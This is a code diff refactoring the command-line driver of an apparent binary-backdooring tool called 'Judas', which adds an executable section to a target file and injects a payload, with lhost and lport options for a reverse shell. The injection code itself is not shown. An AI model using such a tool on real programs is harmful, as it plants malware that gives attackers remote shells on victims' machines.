@@ -1,14 +1,14 @@
 #! /usr/bin/env python3
 
 import argparse
-from _init_ import section_injection, payload_injection, wizard
-
+from judas import Judas
+from wizard import run
 banner = """
-       __          __          
+       __          __
       / /_  ______/ /___ ______
  __  / / / / / __  / __ `/ ___/
-/ /_/ / /_/ / /_/ / /_/ (__  ) 
-\____/\__,_/\__,_/\__,_/____/                                
+/ /_/ / /_/ / /_/ / /_/ (__  )
+\____/\__,_/\__,_/\__,_/____/
 """
 print(banner)
 
@@ -75,23 +75,24 @@ parser.add_argument('-w',
                     action='store_true',
                     help='run tool in wizard mode',
                     default=False)
-args = parser.parse_args()
 
+
+parser.add_argument('-v',
+                    '--verbose',
+                    action='store_true',
+                    help='print verbose output',
+                    default=False)
+args = parser.parse_args()
 if args.wizard:
-    args = wizard.run(args)
+    args = run(args)
 
 print("Adding new section...")
+injected = Judas(args.type, args.path, args.section_name,
+                 args.page_size, args.section_size, args.section_permissions, args.verbose, lhost=args.lhost, lport=args.lport)
 
-injected_path = section_injection.add_section(args.path,
-                                              args.section_name,
-                                              args.page_size,        # Page Size 1024
-                                              args.section_size,        # Section Size 1024
-                                              args.section_permissions)    # permissions READ WRITE EXECUTE
+injected.add_section()
 
 print("Injecting payload...")
 # insert_payload can take lhost and lport for rev
-payload_injection.insert_payload(
-    original_path=injected_path,
-    payload=args.type,
-    lhost=args.lhost,
-    lport=args.lport)
+
+injected.insert_payload()
